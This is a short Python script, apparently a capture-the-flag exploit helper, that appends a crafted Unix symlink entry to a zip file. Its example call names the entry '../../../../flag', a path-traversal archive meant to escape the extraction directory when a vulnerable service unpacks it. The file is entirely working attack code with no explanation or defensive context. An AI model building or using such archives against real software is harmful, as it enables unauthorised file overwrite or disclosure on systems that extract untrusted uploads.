import zipfile
import os
import stat


def add_symlink_to_zip(zip_path, link_name, target):
    with zipfile.ZipFile(zip_path, 'a') as zipf:
        # Create a ZipInfo object for the symlink
        info = zipfile.ZipInfo(link_name)
        info.create_system = 3  # Unix
        # Set permissions to symlink: 0o120777 << 16 is for symlinks in Unix
        info.external_attr = (0o120777 << 16)  # symlink with 0777 permissions

        # The target of the symlink is stored as the file contents
        zipf.writestr(info, target)

# Example usage
add_symlink_to_zip('example.zip', '../../../../flag', 'hello.txt')